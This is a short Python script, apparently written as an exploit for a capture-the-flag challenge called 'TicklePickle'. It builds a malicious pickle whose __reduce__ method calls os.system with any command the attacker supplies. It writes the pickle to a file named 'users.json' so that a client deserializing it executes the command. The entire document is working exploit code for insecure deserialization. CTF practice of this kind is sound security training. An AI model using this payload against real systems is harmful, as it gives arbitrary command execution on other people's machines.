#!/usr/bin/env python3

import os
import pickle
import argparse

class Exp:
    def __init__ (self, cmd):
        self.cmd = cmd

    def __reduce__ (self):
        return (os.system, (self.cmd, ), )

def exploit ():
    parser = argparse.ArgumentParser('Exploit for TicklePickle Sainya Ranakshetram CTF')
    parser.add_argument('--cmd', help = 'Command to execute by attacker on client\'s machine', required = True, type = str)

    args = parser.parse_args()

    with open('users.json', 'wb') as file:
        pickled = pickle.dumps(Exp(args.cmd))
        file.write(pickled)

if __name__ == '__main__':
    exploit()
